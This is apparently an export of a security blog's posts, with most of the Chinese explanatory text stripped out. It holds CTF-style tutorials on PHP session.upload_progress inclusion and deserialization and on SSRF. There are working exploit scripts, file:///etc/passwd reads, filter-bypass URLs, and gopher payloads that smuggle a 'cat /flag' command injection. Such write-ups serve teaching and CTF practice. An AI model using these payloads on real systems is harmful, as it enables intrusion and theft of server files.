(&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session):    while True:        resp = session.post(&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;+sessid,data=data)        if &#x27;tgao.txt&#x27; in resp.text:            print(resp.text)            event.clear()        else:            print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;:    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg\"\n                        alt=\"session.upload_progress\"\n                 ></p>\n<h3 id=\"ctf\"><a href=\"#ctf\" class=\"headerlink\" title=\"ctf\"></a>ctf</h3><p>justsoso,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;    &lt;?php    error_reporting(0);    $file = $_GET[&quot;file&quot;];    $payload = $_GET[&quot;payload&quot;];    if(!isset($file))&#123;        echo &#x27;Missing parameter&#x27;.&#x27;&lt;br&gt;&#x27;;    &#125;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&#x27;hack attacked!!!&#x27;);    &#125;    @include($file);    if(isset($payload))&#123;        $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);        parse_str($url[&#x27;query&#x27;],$query);        foreach($query as $value)&#123;            if (preg_match(&quot;/flag/&quot;,$value)) &#123;                die(&#x27;stop hacking!&#x27;);                exit();            &#125;        &#125;        $payload = unserialize($payload);    &#125;else&#123;       echo &quot;Missing parameters&quot;;    &#125;    ?&gt;    &lt;!--Please test index.php?file=xxx.php --&gt;    &lt;!--Please get the source of hint.php--&gt;    &lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>$file</code></p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<blockquote>\n<p>1. </p>\n<p>2. session</p>\n<p>3. session</p>\n</blockquote>\n<h2 id=\"session-upload-progress\"><a href=\"#session-upload-progress\" class=\"headerlink\" title=\"session.upload_progress\"></a>session.upload_progress</h2><h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p>php5.5.38</p>\n<p>win10</p>\n<p><code>session.serialize_handler=php_serialize</code>session</p>\n</blockquote>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?phperror_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle=new TimeNow();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        $this-&gt;ip = &#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p></p>\n<p><strong></strong></p>\n<p><code>PHP_SESSION_UPLOAD_PROGRESS</code>session</p>\n<p></p>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><p>exp.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle = new IP();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        //$this-&gt;ip=&#x27;payload&#x27;;        $this-&gt;ip=&#x27;phpinfo();&#x27;;        //$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(&quot;O:4:&quot;,&quot;|O:4:&quot;,$c);echo $d;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>exp.py</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b&#x27;a&#x27; * 1024 *1024*1)    while True:        et.wait()        url = &#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port)+&#x27;/test5.php&#x27;        headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;,        &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,        &#x27;DNT&#x27;: &#x27;1&#x27;,        &#x27;Cookie&#x27;: &#x27;PHPSESSID=20190506&#x27;,        &#x27;Connection&#x27;: &#x27;close&#x27;,        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;        &#125;        proxy = &#123;        &#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27;        &#125;        data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;123&#x27;&#125;        files=&#123;            &#x27;file&#x27;:(r&#x27;|O:4:\\&quot;Door\\&quot;:1:&#123;s:6:\\&quot;handle\\&quot;;O:2:\\&quot;IP\\&quot;:1:&#123;s:2:\\&quot;ip\\&quot;;s:10:\\&quot;phpinfo();\\&quot;;&#125;&#125;&#x27;,f,&#x27;text/plain&#x27;)        &#125;        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=&quot;utf-8&quot;        if len(resp.text)&lt;2000:            print(&#x27;[+++++]retry&#x27;)        else:            print(resp.content.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-8&#x27;))            et.clear()            print(&#x27;success!&#x27;)            if __name__ == &quot;__main__&quot;:    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()</span><br></pre></td></tr></table></figure>\n\n<p>burp</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small\"\n                        alt=\"session.upload_progress\"\n                 ></p>\n<p></p>\n<blockquote>\n<p>PHPSESSID</p>\n<p>filename<code>|</code>,session<code>PHP_SESSION_UPLOAD_PROGRESS</code></p>\n<p><code>f = io.BytesIO(b&#39;a&#39; * 1024 *1024*1)</code></p>\n<p>filename<a class=\"link\"   href=\"https://blog.csdn.net/iriszx999/article/details/82113521\" >python<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><code>exp.py</code><code>exp.py</code>,</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg\"\n                        alt=\"session.upload_progress\"\n                 ></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p>burp<code>exp.py</code>burpburp</p>\n<p><code>PHP_SESSION_UPLOAD_PROGRESS</code><code>|</code>session</p>\n</blockquote>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><p>session</p>\n<p><code>PHP_SESSION_UPLOAD_PROGRESS</code></p>\n"},{"title":"SSRF","date":"2022-05-17T15:41:21.000Z","excerpt":"SSRF","_content":"\n\n\n![SSRF](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201984.jpeg)\n\n> FreeBufFreeBuf\n\nCTFSSRFSSRFSSRF\n\n## \n\nSSRFServer-Side Request Forgery:SSRF\n\nSSRF URLSSRFWEB\n\nUbuntuWEBUbuntuWEBSSRFWEBRedisMySqlFastCGIWEB![image-20210112220229389](https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small)\n\n**SSRF**\n\n> 1.  \n>\n> 2.  URL\n>\n> 3.  \n>\n> 4.  /URL\n>\n> 5.  /URLtitle\n>\n> 6.  ssrf\n>\n> 7.  url\n>\n> 8.  mongodbcopyDatabase\n>\n> 9.  \n>\n> 10.  ffpmgImageMagickdocxpdfxml\n>\n> 11.  apiURLgoogleSSRFurlsharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain\n>\n> 12.  \n>\n\n**SSRF**\n\n> 1.  banner\n>\n> 2.  redismysql\n>\n> 3.  Web\n>\n> 4.  WebHTTP GET/POSTsql\n>\n> 5.  file\n>\n> 6.  \n>\n\n## SSRF\n\n+   file\\_get\\_contents()url\n    \n+   readfile()\n    \n+   fsockopen()Unix \n    \n+   curl\\_exec()cURLcurl\\_setopt()curl\\_exec()curl\\_close() \n    \n+   fopen() URL\n    \n+   ......\n    \n\nSSRF PHPSoapClientSSRF\n\n### file\\_get\\_contents()\n\n\n\n```\n// ssrf.php\n<?php\n$url = $\\_GET\\['url'\\];;\necho file\\_get\\_contents($url);\n?>\n```\n\nfile\\_get\\_contents() url`ssrf.php?url=../../../../../etc/passwd`paylaod\n\n![image-20210112225820457](https://image.3001.net/images/20210114/1610597996_5fffc66c9d8087b2c3242.png!small)\n\nreadfile()file\\_get\\_contents()\n\n### fsockopen()\n\n`fsockopen($hostname,$port,$errno,$errstr,$timeout)`Unix hostnameurlsockettcp fsockopen()fgets()fgetss()fwrite()fclose()feof()false\n\n\n\n```\n// ssrf.php\n<?php\n$host=$\\_GET\\['url'\\];\n$fp = fsockopen($host, 80, $errno, $errstr, 30);\nif (!$fp) {\n    echo \"$errstr ($errno)<br />\\\\n\";\n} else {\n    $out = \"GET / HTTP/1.1\\\\r\\\\n\";\n    $out .= \"Host: $host\\\\r\\\\n\";\n    $out .= \"Connection: Close\\\\r\\\\n\\\\r\\\\n\";\n    fwrite($fp, $out);\n    while (!feof($fp)) {\n        echo fgets($fp, 128);\n    }\n    fclose($fp);\n}\n?>\n```\n\n`ssrf.php?url=www.baidu.com`ssrf\n\n![image-20210112230552313](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201642.jpeg)\n\n### curl\\_exec()\n\ncurl\\_init(url)cURLcurl\\_setopt()curl\\_exec()curl\\_close() \n\n\n\n```\n// ssrf.php\n<?php \nif (isset($\\_GET\\['url'\\])){\n\t$link = $\\_GET\\['url'\\];\n\t$curlobj = curl\\_init(); //  cURL \n\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\n\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\n\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); //  URL \n\t$result=curl\\_exec($curlobj); //  URL \n\tcurl\\_close($curlobj); //  cURL \n```\n\n\n\n\t// $filename = './curled/'.rand().'.txt';\n\t// file\\_put\\_contents($filename, $result); \n\techo $result;\n}\n?>\n\n`ssrf.php?url=www.baidu.com`ssrf\n\n![image-20210112231108247](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201758.jpeg)\n\n### SoapClient\n\nSOAPSOAP XML  WEB PHP  SoapClient SOAP WEB  PHP \n\nSoapClientphp`__call``__call`HTTPHTTPS\n\npublic SoapClient :: SoapClient(mixed $wsdl \\[array $options \\])\n\n+   wsdl\n    \n+   wsdlwsdllocationurilocationSOAPURL uri SOAP\n    \n\nSSRFPayloadnulllocationurilocationtarget\\_url\n\n```\n// ssrf.php  \n<?php  \n$a = new SoapClient(null,array('uri'=>'http://47.xxx.xxx.72:2333', 'location'=>'http://47.xxx.xxx.72:2333/aaa'));  \n$b = serialize($a);  \necho $b;  \n$c = unserialize($b);  \n$c->a();    // , \\_\\_callssrf  \n?>\n```\n\n47.xxx.xxx.722333ssrf.php47.xxx.xxx.72\n\n![image-20210112234821125](https://image.3001.net/images/20210114/1610597999_5fffc66f758c21c129c42.png!small)\n\nssrf\n\nhttp/httpshttpcrlfssrf+crlfhttp[SoapClient+crlfSSRF](https://www.anquanke.com/post/id/202025)\n\n### SSRF\n\nSSRF\n\n+   file  file \n    \n+   dictredis\n    \n+   gophergopherGETPOSTgetpostgophergopherssrf()shell\n    \n+   http/s\n    \n\n\n\n## filehttp/sdict\n\nSSRF\n\n\n\n```\n// ssrf.php\n<?php \nif (isset($\\_GET\\['url'\\])){\n\t$link = $\\_GET\\['url'\\];\n\t$curlobj = curl\\_init(); //  cURL \n\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\n\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\n\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); //  URL \n\t$result=curl\\_exec($curlobj); //  URL \n\tcurl\\_close($curlobj); //  cURL \n```\n\n\n\n\t// $filename = './curled/'.rand().'.txt';\n\t// file\\_put\\_contents($filename, $result); \n\techo $result;\n}\n?>\n\n### file\n\npayload\n\nssrf.php?url=file:///etc/passwd  \nssrf.php?url=file:///var/www/html/flag.php\n\n![image-20210113000529370](https://image.3001.net/images/20210114/1610598000_5fffc670560e2d6fed29c.png!small)\n\n![image-20210113000640979](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201861.jpeg)\n\n### http/s\n\n/etc/hosts/proc/net/arp/proc/net/fib\\_trie\n\nIPIPIP\n\n+   C192.168.0.0 - 192.168.255.255\n    \n+   B172.16.0.0 - 172.31.255.255\n    \n+   A10.0.0.0 - 10.255.255.255\n    \n\n\n\n![image-20210113190506825](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201380.jpeg)\n\nWEBUbuntuSSRFpayloadUbuntu\n\nssrf.php?url=http://192.168.52.1  \nssrf.php?url=http://192.168.52.6  \nssrf.php?url=http://192.168.52.25  \n......\n\nburpsuiteIntruder\n\n![image-20210113120505690](https://image.3001.net/images/20210114/1610598003_5fffc67301c9d222a58c6.png!small)\n\n![image-20210113120551977](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201508.jpeg)\n\n192.168.52.130192.168.52.131\n\n![image-20210113120806794](https://image.3001.net/images/20210114/1610598005_5fffc6750b23dd040c364.png!small)\n\n### http/sdict\n\n\n\n![image-20210113190455756](https://image.3001.net/images/20210114/1610598006_5fffc67625206702cdd18.png!small)\n\ndictpayload\n\nssrf.php?url=dict://192.168.52.131:6379/info   // redis  \nssrf.php?url=dict://192.168.52.131:80/info     // http  \nssrf.php?url=dict://192.168.52.130:22/info   // ssh\n\n![image-20210113190244954](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201787.jpeg)\n\n![image-20210113122530377](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201476.jpeg)\n\nburpsuite\n\n## \n\nSSRF\n\n+   WebHTTPHTTPS\n    \n+   [http://www.xxx.com](http://www.xxx.com/)\n    \n+   IP\n    \n+   \n    \n\n### HTTP\n\n [http://www.xxx.com](http://www.xxx.com/)HTTP@[http://www.xxx.com@www.evil.com](http://www.evil.com/)\n\n### 302IP\n\nip**302**\n\n1 [http://xip.io](http://xip.io/)\n\n[http://127.0.0.1.xip.io/flag.php](http://127.0.0.1.xip.io/flag.php)[http://127.0.0.1/1.php](http://127.0.0.1/1.php)[http://nip.io](http://nip.io/)[http://sslip.io](http://sslip.io/)\n\nflag.php\n\n![image-20210113124813254](https://image.3001.net/images/20210114/1610598008_5fffc67858617e4b20974.png!small)\n\n2 [https://4m.cn/](https://4m.cn/)\n\n![image-20201027163528110](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201164.jpeg)\n\n [https://4m.cn/FjOdQ](https://4m.cn/FjOdQ)302 [http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)WAF\n\n![image-20210113124727560](https://image.3001.net/images/20210114/1610598010_5fffc67a644209d507f01.png!small)\n\n### IP\n\nipWAFphp\n\n```\n<?php  \n$ip = '127.0.0.1';  \n$ip = explode('.',$ip);  \n$r = ($ip\\[0\\] << 24) | ($ip\\[1\\] << 16) | ($ip\\[2\\] << 8) | $ip\\[3\\] ;  \nif($r < 0) {  \n$r += 4294967296;  \n}  \necho \":\";     // 2130706433  \necho $r;  \necho \":\";     // 0177.0.0.1  \necho decoct($r);  \necho \":\";   // 0x7f.0.0.1  \necho dechex($r);  \n?>\n```\n\n\n\n### 127.0.0.1\n\nhttp://localhost/         # localhost127.0.0.1  \nhttp://0/                 # 0window0.0.0.0liunx127.0.0.1  \nhttp://\\[0:0:0:0:0:ffff:127.0.0.1\\]/    # liunxwindow  \nhttp://\\[::\\]:80/           # liunxwindow  \nhttp://127001/       #   \nhttp://...  \nhttp://127.1/  \nhttp://127.00000.00000.001/ # 0127.0.0.1\n\n### \n\n`file_get_contents()`PHP`file_get_contents()`include()\n\n\n\n```\n// ssrf.php  \n<?php  \nhighlight\\_file(\\_\\_FILE\\_\\_);  \nif(!preg\\_match('/^https/is',$\\_GET\\['url'\\])){  \ndie(\"no hack\");  \n}  \necho file\\_get\\_contents($\\_GET\\['url'\\]);  \n?>\n```\n\nurlhttps\n\nhttpsssss://\n\n`file_get_contents()`httpsssss://\n\nssrf.php?url=httpsssss://../../../../../../etc/passwd\n\n![image-20210113130534208](https://image.3001.net/images/20210114/1610598011_5fffc67b28e67ca0b6d7f.png!small)\n\nSSRF\n\n### URL\n\nOrange Tsai2017 BlackHat [A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)readfileparse\\_urlcurlparse\\_url\n\n**1readfileparse\\_url**\n\n\n\n```\n// ssrf.php\n<?php\n$url = 'http://'. $\\_GET\\[url\\];\n$parsed = parse\\_url($url);\nif( $parsed\\[port\\] == 80 ){  // url80\n\treadfile($url);\n} else {\n\tdie('Hacker!');\n}\n```\n\npython11211WEB\n\n![image-20210113133210683](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201658.jpeg)\n\nurl8011211\n\nssrf.php?url=127.0.0.1:11211:80/flag.txt\n\n![image-20210113133242461](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202332.jpeg)\n\n11211flag.txtBlackHat\n\n![1610601312_5fffd36035478c41c2c18.png!small?1610601312696](https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696)\n\nreadfile()11211parse\\_url()80WAF\n\nhost\n\n![1610601347_5fffd383dfc1a3982425f.png!small?1610601348433](https://image.3001.net/images/20210114/1610601347_5fffd383dfc1a3982425f.png!small?1610601348433)\n\nreadfile()@evil.comparse\\_url()@google.comparse\\_url()host\n\n**2curlparse\\_urlhost**\n\n\n\n![1610601386_5fffd3aa565a51587d90c.png!small?1610601386867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202234.jpeg)\n\ncurl()@parse\\_url()@parse\\_url()host\n\n\n\n```\n<?php\nhighlight\\_file(\\_\\_FILE\\_\\_);\nfunction check\\_inner\\_ip($url)\n{\n    $match\\_result=preg\\_match('/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/',$url);\n    if (!$match\\_result)\n    {\n        die('url fomat error');\n    }\n    try\n    {\n        $url\\_parse=parse\\_url($url);\n    }\n    catch(Exception $e)\n    {\n        die('url fomat error');\n        return false;\n    }\n    $hostname=$url\\_parse\\['host'\\];\n    $ip=gethostbyname($hostname);\n    $int\\_ip=ip2long($ip);\n    return ip2long('127.0.0.0')>>24 == $int\\_ip>>24 || ip2long('10.0.0.0')>>24 == $int\\_ip>>24 || ip2long('172.16.0.0')>>20 == $int\\_ip>>20 || ip2long('192.168.0.0')>>16 == $int\\_ip>>16;// ip\n}\nfunction safe\\_request\\_url($url)\n{\n    if (check\\_inner\\_ip($url))\n    {\n        echo $url.' is inner ip';\n    }\n    else\n    {\n        $ch = curl\\_init();\n        curl\\_setopt($ch, CURLOPT\\_URL, $url);\n        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);\n        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);\n        $output = curl\\_exec($ch);\n        $result\\_info = curl\\_getinfo($ch);\n        if ($result\\_info\\['redirect\\_url'\\])\n        {\n            safe\\_request\\_url($result\\_info\\['redirect\\_url'\\]);\n        }\n        curl\\_close($ch);\n        var\\_dump($output);\n    }\n}\n$url = $\\_GET\\['url'\\];\nif(!empty($url)){\n    safe\\_request\\_url($url);\n}\n?>\n```\n\n`check_inner_ip``url_parse()`IP IP `curl()` url curlparse\\_url`parse_url()``curl()`paylaod\n\nssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php\n\n![image-20210113134443846](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202304.jpeg)\n\n [\\[2020 \\]doyouknowssrf](https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5)\n\n## Gopher\n\n### GopherSSRF\n\nGopherInternetInternetInternetWWWGopherInternetGopherTCP 70WWWGopher\n\nGopherSSRFSSRFGopherGETPOSTGETPOSTGopherpayloadSSRFRedisMySqlFastCGISSRF\n\n**1Gopher**\n\nURL: gopher://<host>:<port>/<gopher-path>\\_TCP  \n\n\\# \"\\_\"\"\\_\"TCP\"\\_\"\n\n+   gopher70\n    \n+   POST`%0d%0a``%0a`&URL\n    \n\n> GopherHTTPGETHTTPgopherHTTP\n>\n> 1.  HTTP\n>\n> 2.  URL`%0a``%0d%0a`\n>\n> 3.  gopher\n>\n\n**2GopherHTTP GET**\n\n\n\n```\n// echo.php  \n<?php  \necho \"Hello \".$\\_GET\\[\"whoami\"\\].\"\\\\n\"  \n?>\n```\n\npayloadGETHTTP\n\n```\nGET /echo.php?whoami=Bunny HTTP/1.1  \nHost: 47.xxx.xxx.72\n```\n\nGopherpayload\n\n```\nimport urllib.parse  \npayload =\\\\  \n\"\"\"GET /echo.php?whoami=Bunny HTTP/1.1  \nHost: 47.xxx.xxx.72  \n\"\"\"    \n```\n\n\\# http  \n\n```\ntmp = urllib.parse.quote(payload)  \nnew = tmp.replace('%0A','%0D%0A')  \nresult = 'gopher://47.xxx.xxx.72:80/'+'\\_'+new  \nprint(result)\n```\n\n![image-20210113170748727](https://image.3001.net/images/20210114/1610598015_5fffc67f7078252c1e5a9.png!small)\n\n> ****\n>\n> 1.  ?URL%3f\n>\n> 2.  %0d%0a,%0a\n>\n> 3.  HTTP%0d%0aHTTP\n>\n\n\n\n```\ncurl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A\n```\n\n![image-20210113171043970](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202964.jpeg)\n\nGETHello Bunny\n\n**3GopherHTTP POST**\n\n\n\n```\n// echo.php  \n<?php  \necho \"Hello \".$\\_POST\\[\"whoami\"\\].\"\\\\n\"  \n?>\n```\n\npayloadPOSTHTTP\n\n```\nPOST /echo.php HTTP/1.1\nHost: 47.xxx.xxx.72\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwhoami=Bunny\n```\n\n**HTTPPOSTPOSTHostContent-TypeContent-LengthGETContent-Lengthwhoami=Bunny**\n\nPOSTURLgopher\n\n```\nimport urllib.parse\npayload =\\\\\n\"\"\"POST /echo.php HTTP/1.1\nHost: 47.xxx.xxx.72\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwhoami=Bunny\n\"\"\"  \n```\n\n\n# http\n```\ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://47.xxx.xxx.72:80/'+'\\_'+new\nprint(result)\n```\n\n![image-20210113171513366](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202109.jpeg)\n\n\n\n```\ncurl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A\n```\n\n![image-20210113171641047](https://image.3001.net/images/20210114/1610598018_5fffc682e955f917dcc6e.png!small)\n\nPOSTHello Bunny\n\n**\\[2020 \\]Web1**GopherHTTP POSTSSRF\n\n### \\[2020 \\]Web1\n\n\n\n![image-20200921134331679](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202960.jpeg)\n\nSSRFurl`file``ftp``127.0.0.1`tool.phpNot localhostssrftool.phppayload\n\n```\n<?php  \nclass Welcome {  \nprotected $url = \"http://127.0.0.1/tool.php\";\n\n}  \n$poc = new Welcome;  \n//echo serialize($poc);  \necho urlencode(serialize($poc));  \n?>\n```\n\n\n\n```\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D\n\n// O:7:\"Welcome\":1:{s:6:\"\\*url\";s:25:\"http://127.0.0.1/tool.php\";}\n```\n\nWelcome12`__destruct()`\n\n![image-20200921134812338](https://image.3001.net/images/20210114/1610598020_5fffc684e27d96d0c30be.png!small)\n\ntool.php\n\n```\n#tool.php\n<?php\nerror\\_reporting(0);\n$respect\\_show\\_ping = function($params) {\n   extract($params);\n   $ip = isset($ip) ? $ip :'127.0.0.1';\n   system('ping -c 1 '.$ip);\n};\nif ($\\_SERVER\\[\"REMOTE\\_ADDR\"\\] !== \"127.0.0.1\"){\n   echo '<h2>Not localhost!</h2>';\n}\nelse {\n   highlight\\_file(\\_\\_FILE\\_\\_);\n   $respect\\_show\\_ping($\\_POST);\n}\n?>\n```\n\ntool.phpREMOTE\\_ADDR127.0.0.1REMOTE\\_ADDRIPIPtcpIPREMOTE\\_ADDRIPX-Forwarded-For\n\nREMOTE\\_ADDR127.0.0.1REMOTE\\_ADDRREMOTE\\_ADDR127.0.0.1X-Forwarded-ForSSRF\n\nindex.phpSSRFgopherPOSTtool.phpREMOTE\\_ADDR127.0.0.1\n\nSSRFgopherPOST\n\n```\nimport urllib.parse\ntest =\\\\\n\"\"\"POST /tool.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\n\nip=;cat /flag\n\"\"\"  \n```\n\n#http\n\n```\ntmp = urllib.parse.quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://127.0.0.1:80/'+'\\_'+new\nprint(result)\n```\n\npayloadHostgopherHost127.0.0.1\n\ngopherpayload\n\n```\ngopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\n```\n\nexp\n\n```\n<?php\nclass Welcome {\n    protected $url = \"gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\";\n    \n}\n$poc = new Welcome;\n//echo serialize($poc);\necho urlencode(serialize($poc));\n?>\n```\n\npayload\n\n```\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D\n\n\n```\n\nWelcome12`__destruct()`\n\n![image-20200921135622488](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202364.jpeg)\n\n\n\n****POSTGETURLpayloadurl%20curl\\_execgopherURLpayloadURL\n\n```\ngopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A\n```\n\n\n\n## 